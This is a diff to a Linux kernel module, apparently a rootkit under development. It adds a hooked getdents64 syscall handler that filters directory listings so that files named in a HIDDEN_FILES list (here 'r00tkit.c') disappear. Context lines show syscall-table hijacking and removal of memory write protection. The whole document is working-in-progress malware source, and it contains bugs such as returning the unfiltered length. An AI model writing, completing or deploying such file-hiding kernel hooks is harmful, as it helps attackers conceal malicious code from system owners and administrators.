@@ -8,6 +8,8 @@
 #include <linux/uaccess.h>
 #include <linux/slab.h>
 
+#include <linux/types.h>
+
 // #include <linux/tty.h>
 
 MODULE_LICENSE("GPL");
@@ -16,6 +18,8 @@ MODULE_DESCRIPTION("");
 
 int (*real_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int (*real_getdents)(unsigned int, struct linux_dirent *, unsigned int);
+
+const char * const HIDDEN_FILES[] = {"r00tkit.c"};
 
 /*
 static void printString(char *string)
@@ -48,7 +52,7 @@ static inline void unprotect_memory(void)
 	asm("popq %rax");
 }
 
-struct linux_derent64 {
+struct linux_dirent64 {
 	unsigned long long 	d_ino;
 	signed long long	d_off;
 	unsigned short		d_reclen;
@@ -73,14 +77,64 @@ unsigned long *get_syscall_table_bf(void)
 	return syscall_table;
 }
 
-int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
+int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int length)
 {
-	int ret = real_getdents64(fd, dirp, count);
+	int ret = real_getdents64(fd, dirp, length);
 	
-	printk("getdents64 syscall\n");
+	unsigned int offset = 0;
+	struct linux_dirent64 *cur_dirent;
+	int i;
+	struct dirent64 *new_dirp = NULL;
+	int new_length = 0;
+	bool isHidden = false;
 
-	return ret;
+	// const char * const HIDDEN_FILES[] = {"r00tkit.c"};
+
+	// Create a new output buffer for the return of getdents
+	new_dirp = (struct dirent64 *) kmalloc(ret, GFP_KERNEL);
+	if(!new_dirp)
+	{
+		goto error;
+	}
+
+	while (offset < ret)
+	{
+		char *dirent_ptr = (char *)(dirp);
+		dirent_ptr += offset;
+		cur_dirent = (struct linux_dirent64 *)dirent_ptr;
+
+		isHidden = false;
+		for (i = 0; i < sizeof(HIDDEN_FILES) / sizeof(char *); i++)
+		{
+			if (strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
+			{
+				isHidden = true;
+				break;
+			}
+		}
+		if (!isHidden)
+		{
+			memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
+			new_length += cur_dirent->d_reclen;
+		}
+		offset += cur_dirent->d_reclen;
+	}
+
+	memcpy(dirp, new_dirp, new_length);
+
+cleanup:
+	if(new_dirp)
+		kfree(new_dirp);
+	return length;
+error:
+	goto cleanup;
 }
+
+	// printk("getdents64 syscall\n");
+	// printk("ret = %d\n", ret);
+
+//	return ret;
+//}
 
 /*
 int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
